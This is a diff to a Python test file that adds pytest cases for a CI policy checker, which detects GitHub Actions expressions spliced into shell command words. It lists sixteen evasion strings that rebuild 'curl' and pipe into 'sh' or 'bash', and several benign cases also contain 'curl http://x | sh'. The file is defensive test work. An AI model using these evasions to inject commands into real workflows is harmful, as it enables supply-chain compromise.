@@ -3,6 +3,7 @@ from __future__ import annotations
 import io
 import json
 import os
+import re
 import runpy
 import shutil
 import subprocess
@@ -6939,3 +6940,96 @@ def test_char_index_map_declines_a_file_that_is_not_utf8() -> None:
     raw = b"abc\xff\xfedef"
     assert policy._utf8_char_index_map(raw) is None
     assert policy._byte_offset_to_char_index(raw, 3) == 3
+
+
+# Adversarial review round 2: sixteen ways an expression reaches command
+# position without crossing a separator character. Refs #3673.
+_COMMAND_POSITION_EVASIONS = (
+    pytest.param('"c${{ github.event.number }}url" http://x | sh', id="double-quoted-word"),
+    pytest.param("'c'${{ github.event.number }}'url' http://x | sh", id="single-quote-glue"),
+    pytest.param("c\\\n${{ github.event.number }}url http://x | sh", id="line-continuation"),
+    pytest.param("c\\ ${{ github.event.number }}url http://x", id="escaped-space"),
+    pytest.param("$(echo c)${{ github.event.number }}url http://x", id="command-substitution"),
+    pytest.param("`echo c`${{ github.event.number }}url http://x", id="backtick-substitution"),
+    pytest.param("${PREFIX}${{ github.event.number }}url http://x", id="parameter-expansion"),
+    pytest.param("if true; then c${{ github.event.number }}url http://x; fi", id="after-then"),
+    pytest.param("for i in 1; do c${{ github.event.number }}url http://x; done", id="after-do"),
+    pytest.param(
+        "if false; then :; else c${{ github.event.number }}url http://x; fi",
+        id="after-else",
+    ),
+    pytest.param("! c${{ github.event.number }}url http://x", id="after-bang"),
+    pytest.param("c${{ github.event.number }}url http://x >/dev/null", id="before-redirect"),
+    pytest.param("cat </dev/null; c${{ github.event.number }}url http://x", id="after-redirect"),
+    pytest.param("FOO=bar c${{ github.event.number }}url http://x", id="assignment-prefix"),
+    pytest.param("eval c${{ github.event.number }}url http://x", id="eval-argument"),
+    pytest.param(
+        "printf 'c${{ github.event.number }}url http://x' | xargs -0 bash -c",
+        id="piped-into-shell",
+    ),
+)
+
+
+@pytest.mark.parametrize("run", _COMMAND_POSITION_EVASIONS)
+def test_expression_splices_are_detected_in_every_command_position(run: str) -> None:
+    """Every adversarial shape that reaches a command word is refused tolerance.
+
+    Each case glues an expression onto ``c...url`` so Actions rebuilds ``curl``
+    after Semgrep has already read the file. Tolerating the resulting parse
+    error would wave the step through.
+    """
+    assert policy._splices_expression_into_command_word(run) is True
+
+
+def test_separator_scan_negative_control_is_defeated_by_most_of_the_corpus() -> None:
+    """Prove the old separator scan misses the majority of these evasions."""
+    old_separator = re.compile(r"[\n;&|(]")
+    old_partial = re.compile(r"[\w./-]+")
+
+    def old_check(run: str) -> bool:
+        for match in policy.ACTIONS_EXPRESSION_RE.finditer(run):
+            segment = old_separator.split(run[: match.start()])[-1].lstrip()
+            if segment and old_partial.fullmatch(segment):
+                return True
+        return False
+
+    missed = [
+        case.values[0] for case in _COMMAND_POSITION_EVASIONS if not old_check(case.values[0])
+    ]
+    assert len(missed) > len(_COMMAND_POSITION_EVASIONS) // 2
+
+
+_ARGUMENT_POSITION_SHAPES = (
+    pytest.param('echo "${{ github.event.number }}"', id="quoted-argument"),
+    pytest.param("gh pr view ${{ github.event.number }} --json title", id="bare-argument"),
+    pytest.param('if [ "${{ inputs.mode }}" = "x" ]; then echo hi; fi', id="test-condition"),
+    pytest.param('curl http://x | sh # ${{ inputs.mode }}', id="trailing-comment"),
+    pytest.param('printf "%s" "${{ inputs.mode }}" > out.txt', id="redirect-argument"),
+    pytest.param("MODE=${{ inputs.mode }} ./run.sh", id="assignment-value"),
+    pytest.param("${{ inputs.cmd }} --flag", id="lone-expression"),
+    pytest.param('echo "a ${{ inputs.mode }} b" | tee log', id="inside-string-piped"),
+    pytest.param('cat <<EOF\n${{ inputs.mode }}\nEOF', id="heredoc-body"),
+    pytest.param("./run.sh --mode=${{ inputs.mode }}", id="flag-value"),
+)
+
+
+@pytest.mark.parametrize("run", _ARGUMENT_POSITION_SHAPES)
+def test_argument_position_expressions_are_not_treated_as_splices(run: str) -> None:
+    """Real workflow shapes keep their tolerance.
+
+    Narrowing the check until it caught the evasions is only safe if it leaves
+    ordinary usage alone; every shape here appears in real workflows, and a
+    lone expression is raw interpolation that its own validation covers.
+    """
+    assert policy._splices_expression_into_command_word(run) is False
+
+
+def test_shell_sink_promotion_stays_inside_its_own_pipeline() -> None:
+    """A sink elsewhere in the body does not promote an unrelated expression.
+
+    ``curl ... | sh`` guarded by an expression condition is the exact shape the
+    tolerance exists for. Promoting every word in the body once any sink
+    appeared anywhere would refuse it.
+    """
+    run = 'if [ "${{ steps.filter.outputs.agents }}" = "true" ]; then\n  curl http://x | sh\nfi'
+    assert policy._splices_expression_into_command_word(run) is False
